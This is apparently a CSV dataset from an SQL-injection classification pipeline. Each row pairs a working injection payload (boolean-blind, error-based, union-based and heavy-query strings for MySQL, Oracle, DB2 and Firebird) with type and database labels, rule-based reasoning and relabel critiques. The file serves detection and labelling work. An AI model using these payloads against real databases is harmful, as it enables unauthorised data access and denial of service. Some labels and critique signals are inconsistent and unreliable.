payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals,sources_agree
"1"" ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""atlz"" = ""atlz",boolean_blind,firebird,1.0,"Pattern match: 'or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""atlz"" = ""atlz' -> boolean_blind (P3); DB signature: firebird. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'rdb$'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1"" ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""atlz"" = ""atlz",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,3
"1 ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",boolean_blind,mysql,0.85,"Pattern match: 'or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'extractvalue'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1 ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),2
"1"" ) order by 1--",benign,generic,1.0,No SQLi signal detected no attack signal detected.,RELABEL,type='unknown' needs verification,unknown,generic,"1"" ) order by 1--",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,3
"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'rtbm' = 'rtbm",boolean_blind,db2,1.0,"Pattern match: 'and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'rtbm' = 'rtbm' -> boolean_blind (P3); DB signature: db2. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'sysibm.systables'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'rtbm' = 'rtbm",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,3
"1' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,1.0,"Pattern match: 'and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) -- dpph",boolean_blind,firebird,1.0,"Pattern match: 'or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) -- dpph' -> boolean_blind (P3); DB signature: firebird. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'rdb$'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) -- dpph",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,3
"1'|| ( select 'mwmn' where 5112 = 5112 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",boolean_blind,mysql,0.85,"Pattern match: 'or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'concat'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1'|| ( select 'mwmn' where 5112 = 5112 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),2
"-9845"" ) as xpis where 1936 = 1936 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.85,"Pattern match: 'or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'concat'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-9845"" ) as xpis where 1936 = 1936 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),2
-3497' order by 1#,benign,generic,1.0,No SQLi signal detected no attack signal detected.,RELABEL,type='unknown' needs verification,unknown,generic,-3497' order by 1#,False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,3
"1 ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 7992 = 7992",boolean_blind,generic,1.0,"Pattern match: 'and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 7992 = 7992' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 7992 = 7992",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
1'|| ( select 'xlmt' where 1664 = 1664,boolean_blind,generic,0.85,Agreement on boolean_blind injection targetting generic based on multi-source analysis.,RELABEL,type='unknown' needs verification; confidence too low (0.60); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,1'|| ( select 'xlmt' where 1664 = 1664,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,2
1' ) ) ) order by 1#,benign,generic,1.0,No SQLi signal detected no attack signal detected.,RELABEL,type='unknown' needs verification,unknown,generic,1' ) ) ) order by 1#,False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,3
"1'|| ( select 'mdqc' where 4533 = 4533 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,1.0,"Pattern match: 'and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --' -> boolean_blind (P3); DB signature: db2. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'sysibm.systables'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1'|| ( select 'mdqc' where 4533 = 4533 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,3
"1'|| ( select 'zpwe' from dual where 7743 = 7743 union all select null,null#",union_based,oracle,1.0,Pattern match: 'union all select' -> union_based (P7); DB signature: oracle. union-based keywords (UNION SELECT) detected in payload. DB-specific token found: 'dual'.,RELABEL,type='unknown' needs verification; rule-check disagrees: rule says 'union_based' (P7) but labeled 'unknown' (P99),union_based,oracle,"1'|| ( select 'zpwe' from dual where 7743 = 7743 union all select null,null#",False,0,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,3
"1' ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,1.0,"Pattern match: 'or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1%' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( '%' = '",boolean_blind,generic,1.0,"Pattern match: 'and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( '%' = '' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( '%' = '",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'rfln' = 'rfln",boolean_blind,generic,1.0,"Pattern match: 'and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'rfln' = 'rfln' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'rfln' = 'rfln",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1'+ ( select 'cstd' where 9326 = 9326 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",boolean_blind,mysql,0.85,"Pattern match: 'and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'extractvalue'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1'+ ( select 'cstd' where 9326 = 9326 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),2
"1' in boolean mode ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #",boolean_blind,firebird,1.0,"Pattern match: 'and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #' -> boolean_blind (P3); DB signature: firebird. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'rdb$'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1' in boolean mode ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,3
"1"" ) ) as iubt where 8179 = 8179 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,1.0,"Pattern match: 'or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) ) as iubt where 8179 = 8179 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1' where 1893 = 1893 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,1.0,"Pattern match: 'and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --' -> boolean_blind (P3); DB signature: firebird. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'rdb$'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1' where 1893 = 1893 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,3
"1' ) as ccee where 8880 = 8880 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,1.0,"Pattern match: 'and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) as ccee where 8880 = 8880 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1"" ) ) as krro where 1050 = 1050 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",boolean_blind,mysql,0.5,"Pattern match: 'case when' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'extractvalue'.",RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'time_blind' (P5),error_based,mysql,"1"" ) ) as krro where 1050 = 1050 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",False,0,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),1
"1' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'ejnt' like 'ejnt",boolean_blind,db2,1.0,"Pattern match: 'and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'ejnt' like 'ejnt' -> boolean_blind (P3); DB signature: db2. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'sysibm.systables'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'ejnt' like 'ejnt",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,3
"1"" ) ) as fjtv where 8904 = 8904",boolean_blind,generic,0.5,Agreement on boolean_blind injection targetting generic based on multi-source analysis.,RELABEL,type='unknown' needs verification,unknown,generic,"1"" ) ) as fjtv where 8904 = 8904",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1
"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'ajkb' = 'ajkb",boolean_blind,generic,1.0,"Pattern match: 'and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'ajkb' = 'ajkb' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'ajkb' = 'ajkb",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%"" = """,boolean_blind,generic,1.0,"Pattern match: 'and ""%"" = ""' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
1'+ ( select trte where 9173 = 9173 and 2006 = 2006,boolean_blind,generic,1.0,"Pattern match: 'and 2006 = 2006' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,type='unknown' needs verification; confidence too low (0.60); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,1'+ ( select trte where 9173 = 9173 and 2006 = 2006,False,0,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",3
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""hjxh"" = ""hjxh",boolean_blind,generic,1.0,"Pattern match: 'and ""hjxh"" = ""hjxh' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""hjxh"" = ""hjxh",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
end and ( ( ( 'hglq' like 'hglq,boolean_blind,generic,0.5,Agreement on boolean_blind injection targetting generic based on multi-source analysis.,RELABEL,type='unknown' needs verification; confidence too low (0.60); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,end and ( ( ( 'hglq' like 'hglq,False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1
"1 ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 2230 = 2230",boolean_blind,mysql,0.85,"Pattern match: 'or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 2230 = 2230' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'exp ( ~'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1 ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 2230 = 2230",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),2
-4952' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'abso' = 'abso,boolean_blind,oracle,1.0,"Pattern match: 'or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'abso' = 'abso' -> boolean_blind (P3); DB signature: oracle. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'dual'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,-4952' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'abso' = 'abso,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,3
"1'+ ( select 'vbqo' where 5630 = 5630 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.85,"Pattern match: 'extractvalue (' -> error_based (P4); DB signature: mysql. error-based function (xmltype, extractvalue, updatexml, cast, etc.) detected in payload. DB-specific token found: 'extractvalue'.",RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'time_blind' (P5),error_based,mysql,"1'+ ( select 'vbqo' where 5630 = 5630 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",False,0,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),2
"1"" ) as qnmd where 5642 = 5642",boolean_blind,generic,0.5,Agreement on boolean_blind injection targetting generic based on multi-source analysis.,RELABEL,type='unknown' needs verification,unknown,generic,"1"" ) as qnmd where 5642 = 5642",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""rdri"" = ""rdri",boolean_blind,mysql,0.85,"Pattern match: 'or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""rdri"" = ""rdri' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'updatexml'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""rdri"" = ""rdri",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),2
"1'+ ( select 'aphz' where 1933 = 1933 union all select null,null,null,null,null,null#",union_based,generic,1.0,Pattern match: 'union all select' -> union_based (P7); DB signature: generic. union-based keywords (UNION SELECT) detected in payload.,RELABEL,type='unknown' needs verification; rule-check disagrees: rule says 'union_based' (P7) but labeled 'unknown' (P99),union_based,generic,"1'+ ( select 'aphz' where 1933 = 1933 union all select null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,3
